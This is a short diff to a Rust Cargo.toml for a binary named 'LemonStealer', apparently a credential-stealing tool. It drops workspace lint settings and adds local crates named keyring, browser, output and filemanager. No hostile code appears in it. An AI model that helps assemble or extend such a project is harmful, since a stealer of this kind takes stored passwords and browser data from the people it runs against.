@@ -4,9 +4,6 @@ version.workspace = true
 edition.workspace = true
 license.workspace = true
 
-[lints]
-workspace = true
-
 [[bin]]
 name = "LemonStealer"
 path = "src/main.rs"
@@ -15,3 +12,8 @@ path = "src/main.rs"
 clap = { workspace = true }
 anyhow = { workspace = true }
 hbd_core = { path = "../core" }
+keyring = { path = "../keyring" }
+browser = { path = "../browser" }
+output = { path = "../output" }
+filemanager = { path = "../filemanager" }
+log = { workspace = true }
